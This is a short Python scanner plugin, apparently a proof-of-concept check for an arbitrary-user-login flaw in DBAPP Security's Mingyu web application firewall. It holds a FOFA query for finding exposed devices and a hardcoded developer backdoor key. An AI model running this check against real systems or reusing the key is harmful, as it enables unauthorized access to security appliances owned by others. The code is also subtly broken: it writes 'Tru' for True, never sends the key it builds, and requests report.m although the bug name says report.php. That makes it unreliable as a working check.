#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/iot/安恒/安恒 明御WEB应用防火墙 report.php 任意用户登录漏洞.html',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '安恒 明御WEB应用防火墙 report.php 任意用户登录',

      'level'     :   'high',

      'FOFA'      :   'app="安恒信息-明御WAF"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/report.m?a=rpc-timed'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "error_0x110005" in res.text:
      data= 'key=!@#dbapp-waf-dev-reserved#@!'
      resp = requests.get(url=url,headers=headers,timeout=5,verify=False)
      if resp.status_code == 200 and re.search(r'<title>明御WEB应用防火墙</title>',resp.text,re.S):
        ret['ifbug'] = Tru
        ret['huixian'] = res.text
        res.close()
        return ret
      else:
        return ret
    else:
      return ret
  except:
    return ret